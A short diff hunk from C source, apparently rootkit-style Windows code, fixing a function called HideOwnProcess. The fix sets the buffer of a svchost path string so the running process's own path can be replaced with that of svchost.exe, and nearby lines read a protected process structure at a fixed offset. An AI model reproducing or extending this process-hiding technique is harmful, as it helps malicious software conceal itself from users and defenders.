@@ -182,6 +182,7 @@ VOID HideOwnProcess()
 	//RtlInitUnicodeString(&s_uOwnProcessPath,s_wszOwnProcessPath);
 	s_uSvchostPath.Length = (wcslen(s_wszSvchostPath) + 1) * sizeof(WCHAR);
 	s_uSvchostPath.MaximumLength = s_uSvchostPath.Length;
+	s_uSvchostPath.Buffer = s_wszSvchostPath;
 	ReplaceUnicodeString(pPath,&s_uSvchostPath);
 	//
 	tmp=*(PULONG)((ULONG)g_OwnInfo.pProtectedProcess+0x138);
